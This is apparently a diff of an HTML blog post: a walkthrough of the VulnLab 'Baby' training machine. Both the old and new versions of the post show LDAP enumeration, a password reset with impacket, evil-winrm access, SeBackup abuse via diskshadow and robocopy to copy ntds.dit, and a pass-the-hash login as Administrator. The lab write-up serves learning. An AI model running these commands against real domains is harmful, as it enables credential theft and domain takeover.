@@ -1,4 +1,156 @@
-<html><head><meta charset="utf-8"></head><body><p>We have no anonymous SMB access and we cant get any info from rpc client.</p><p>&nbsp;</p><p>&nbsp;</p><p>Ldap search we can get a lot of juicy info without creds.</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:892/632;" src="../img/posts/2025-03-08-Baby(VulnLab)/01-877693ec27.png" width="892" height="632"></figure><p>&nbsp;</p><p>Default password for users</p><p>BabyStart123!<br>&nbsp;</p><p>Login does not work for teresa.bell though</p><figure class="image"><img style="aspect-ratio:1232/118;" src="../img/posts/2025-03-08-Baby(VulnLab)/02-20c6388ea6.png" width="1232" height="118"></figure><p>&nbsp;</p><p>We can get a list of users with the command below</p><p><code>ldapsearch -H ldap://10.10.124.185 -x -b 'DC=baby,DC=vl' -s sub "(&amp;(objectclass=user))" &nbsp;| grep sAMAccountName: | cut -f2 -d" "</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1074/238;" src="../img/posts/2025-03-08-Baby(VulnLab)/03-b8e492192f.png" width="1074" height="238"></figure><p>&nbsp;</p><p>&nbsp;</p><p>But the password still doesn't work for any other users on the machine. However one user has an interesting popup</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1225/261;" src="../img/posts/2025-03-08-Baby(VulnLab)/04-08caf786ea.png" width="1225" height="261"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can change this using impacket-changepasswd</p><p><code>impacket-changepasswd 'Caroline.Robinson:BabyStart123!@baby.vl' -newpass Password2</code></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:725/180;" src="../img/posts/2025-03-08-Baby(VulnLab)/05-54f23d2990.png" width="725" height="180"></figure><p>&nbsp;</p><p>Confirmed the changed worked</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1231/237;" src="../img/posts/2025-03-08-Baby(VulnLab)/06-c81e9708c6.png" width="1231" height="237"></figure><p>&nbsp;</p><p>We have evil-winrm access</p><p><code>evil-winrm -i baby.vl -u caroline.robinson -p Password2</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:695/212;" src="../img/posts/2025-03-08-Baby(VulnLab)/07-55c5db5b88.png" width="695" height="212"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Grab the user flag</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:730/292;" src="../img/posts/2025-03-08-Baby(VulnLab)/08-396b7263aa.png" width="730" height="292"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We have SeBackup so we can use that to grab the admin flag</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:577/163;" src="../img/posts/2025-03-08-Baby(VulnLab)/09-bc3c2ab85a.png" width="577" height="163"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1008/545;" src="../img/posts/2025-03-08-Baby(VulnLab)/10-942f2999a5.png" width="1008" height="545"></figure><p>&nbsp;</p><p>We can download the SAM database but the ntlm for admin is incorrect.</p><p>&nbsp;</p><p>&nbsp;</p><p>The link below covers a smart way to get the ntds.dit</p><p>https://hiddendoorsecurity.com/2024/05/27/walkthrough-baby-vulnlab/</p><p>&nbsp;</p><p>&nbsp;</p><p>Create a diskshadow.txt file with the contents below</p><p>&nbsp;</p><p>echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii<br>echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append<br>echo "create" | out-file ./diskshadow.txt -encoding ascii -append &nbsp; &nbsp; &nbsp; &nbsp;<br>echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append<br>&nbsp;</p><p>&nbsp;</p><p>then run these commands</p><pre><code class="language-text-plain">echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>VulnLab: Baby | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2025-03-08-Baby(VulnLab)/01-877693ec27.png" alt="VulnLab: Baby cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">VulnLab: Baby</h1>
+                <div class="post-meta">March 8, 2025 &bull; VulnLab</div>
+            </div>
+        </header>
+
+        <p>We have no anonymous SMB access and we cant get any info from rpc client.</p>
+
+        <p>Ldap search we can get a lot of juicy info without creds.</p>
+
+        <img alt="Screenshot 1" height="632" src="../img/posts/2025-03-08-Baby(VulnLab)/01-877693ec27.png" style="aspect-ratio:892/632;" width="892"/>
+
+        <p>Default password for users</p>
+
+        <p>BabyStart123!<br/> </p>
+
+        <p>Login does not work for teresa.bell though</p>
+
+        <img alt="Screenshot 2" height="118" src="../img/posts/2025-03-08-Baby(VulnLab)/02-20c6388ea6.png" style="aspect-ratio:1232/118;" width="1232"/>
+
+        <p>We can get a list of users with the command below</p>
+
+        <pre class="terminal"><code>ldapsearch -H ldap://10.10.124.185 -x -b 'DC=baby,DC=vl' -s sub "(&amp;(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "</code></pre>
+
+        <img alt="Screenshot 3" height="238" src="../img/posts/2025-03-08-Baby(VulnLab)/03-b8e492192f.png" style="aspect-ratio:1074/238;" width="1074"/>
+
+        <p>But the password still doesn't work for any other users on the machine. However one user has an interesting popup</p>
+
+        <img alt="Screenshot 4" height="261" src="../img/posts/2025-03-08-Baby(VulnLab)/04-08caf786ea.png" style="aspect-ratio:1225/261;" width="1225"/>
+
+        <p>We can change this using impacket-changepasswd</p>
+
+        <pre class="terminal"><code>impacket-changepasswd 'Caroline.Robinson:BabyStart123!@baby.vl' -newpass Password2</code></pre>
+
+        <img alt="Screenshot 5" height="180" src="../img/posts/2025-03-08-Baby(VulnLab)/05-54f23d2990.png" style="aspect-ratio:725/180;" width="725"/>
+
+        <p>Confirmed the changed worked</p>
+
+        <img alt="Screenshot 6" height="237" src="../img/posts/2025-03-08-Baby(VulnLab)/06-c81e9708c6.png" style="aspect-ratio:1231/237;" width="1231"/>
+
+        <p>We have evil-winrm access</p>
+
+        <pre class="terminal"><code>evil-winrm -i baby.vl -u caroline.robinson -p Password2</code></pre>
+
+        <img alt="Screenshot 7" height="212" src="../img/posts/2025-03-08-Baby(VulnLab)/07-55c5db5b88.png" style="aspect-ratio:695/212;" width="695"/>
+
+        <p>Grab the user flag</p>
+
+        <img alt="Screenshot 8" height="292" src="../img/posts/2025-03-08-Baby(VulnLab)/08-396b7263aa.png" style="aspect-ratio:730/292;" width="730"/>
+
+        <p>We have SeBackup so we can use that to grab the admin flag</p>
+
+        <img alt="Screenshot 9" height="163" src="../img/posts/2025-03-08-Baby(VulnLab)/09-bc3c2ab85a.png" style="aspect-ratio:577/163;" width="577"/>
+
+        <img alt="Screenshot 10" height="545" src="../img/posts/2025-03-08-Baby(VulnLab)/10-942f2999a5.png" style="aspect-ratio:1008/545;" width="1008"/>
+
+        <p>We can download the SAM database but the ntlm for admin is incorrect.</p>
+
+        <p>The link below covers a smart way to get the ntds.dit</p>
+
+        <p>https://hiddendoorsecurity.com/2024/05/27/walkthrough-baby-vulnlab/</p>
+
+        <p>Create a diskshadow.txt file with the contents below</p>
+
+        <p>echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii<br/>echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append<br/>echo "create" | out-file ./diskshadow.txt -encoding ascii -append        <br/>echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append<br/> </p>
+
+        <p>then run these commands</p>
+
+        <pre class="terminal"><code>echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
 echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
 echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
-echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append</code></pre><p>&nbsp;</p><p>Then execute the command below which clones C: to Z:</p><pre><code class="language-text-plain">diskshadow.exe /s c:\temp\diskshadow.txt</code></pre><figure class="image image-style-block-align-left"><img style="aspect-ratio:1022/551;" src="../img/posts/2025-03-08-Baby(VulnLab)/11-e4db2118b8.png" width="1022" height="551"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Then we can copy the ntds.dit here and download it</p><pre><code class="language-text-plain">robocopy /b Z:\Windows\ntds . ntds.dit</code></pre><p>&nbsp;</p><pre><code class="language-text-plain">download ntds.dit</code></pre><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Then we use impacket to dump the new hashes and get a valid hash for admin</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:955/480;" src="../img/posts/2025-03-08-Baby(VulnLab)/12-b0dae3d4f3.png" width="955" height="480"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><code>evil-winrm -i 10.10.71.244 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d</code></p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:822/250;" src="../img/posts/2025-03-08-Baby(VulnLab)/13-df5d9034a6.png" width="822" height="250"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:533/601;" src="../img/posts/2025-03-08-Baby(VulnLab)/14-d839ae615a.png" width="533" height="601"></figure></body></html>
+echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append</code></pre>
+
+        <p>Then execute the command below which clones C: to Z:</p>
+
+        <pre class="terminal"><code>diskshadow.exe /s c:\temp\diskshadow.txt</code></pre>
+
+        <img alt="Screenshot 11" height="551" src="../img/posts/2025-03-08-Baby(VulnLab)/11-e4db2118b8.png" style="aspect-ratio:1022/551;" width="1022"/>
+
+        <p>Then we can copy the ntds.dit here and download it</p>
+
+        <pre class="terminal"><code>robocopy /b Z:\Windows\ntds . ntds.dit</code></pre>
+
+        <pre class="terminal"><code>download ntds.dit</code></pre>
+
+        <p>Then we use impacket to dump the new hashes and get a valid hash for admin</p>
+
+        <img alt="Screenshot 12" height="480" src="../img/posts/2025-03-08-Baby(VulnLab)/12-b0dae3d4f3.png" style="aspect-ratio:955/480;" width="955"/>
+
+        <pre class="terminal"><code>evil-winrm -i 10.10.71.244 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d</code></pre>
+
+        <img alt="Screenshot 13" height="250" src="../img/posts/2025-03-08-Baby(VulnLab)/13-df5d9034a6.png" style="aspect-ratio:822/250;" width="822"/>
+
+        <img alt="Screenshot 14" height="601" src="../img/posts/2025-03-08-Baby(VulnLab)/14-d839ae615a.png" style="aspect-ratio:533/601;" width="533"/>
+    </article>
+
+</body>
+</html>
